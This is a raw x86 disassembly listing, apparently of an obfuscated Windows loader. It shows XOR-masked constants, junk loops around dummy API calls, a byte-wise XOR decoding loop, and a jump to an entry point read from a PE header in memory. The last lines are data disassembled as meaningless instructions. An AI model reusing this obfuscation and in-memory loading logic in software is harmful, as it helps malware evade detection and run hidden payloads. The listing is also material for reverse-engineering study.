  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d3dc
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d5d8
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d3dc
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41d5d8,eax
  41095e:	mov    eax,ds:0x41d3dc
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d3dc
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d260,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d4b4,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d260
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d3dc
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d4b4
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d260
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41d3dc
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d460,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d458,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d3dc
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff8d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d25c
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d464
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d3dc
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ffef
  410dc5:	push   0x41ffd1
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d3fc
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d352
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d1f8
  411086:	mov    ebx,DWORD PTR ds:0x41d1fc
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41ff2e
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0x2836a5d3
  411322:	fcom   DWORD PTR [edi-0x72]
  411325:	bound  esp,QWORD PTR [edx-0x33]
  411328:	pop    edi
  411329:	bound  esp,QWORD PTR [edx-0xf]
  41132c:	aam    0xdf
  41132e:	mov    ds:0xf05ab762,al
  411333:	and    DWORD PTR ds:0x1dd3cb22,0x3c
  41133a:	pop    ebp
  41133b:	and    al,0xf0
  41133d:	mov    ah,0xdf
  41133f:	pop    ebx
  411340:	fbld   TBYTE PTR ds:0x78dd6d90
  411346:	jmp    0x41134d
  411348:	jecxz  0x411349
  41134a:	pop    esi
  41134b:	xor    eax,0xeeb14330
  411350:	loopne 0x411333
  411352:	jecxz  0x411304
  411354:	mov    esi,0x6df598d8
  411359:	jmp    0x3e53:0x35de17e0
  411360:	and    cl,bh
  411362:	push   0x35abf396
  411367:	jne    0x4113b1
  411369:	pop    esi
  41136a:	xchg   esi,eax
  41136b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41136c:	xlat   BYTE PTR ds:[ebx]
  41136d:	jl     0x411367
  41136f:	dec    esi
  411370:	mov    bl,0x77
  411372:	add    eax,0x7ab90b98
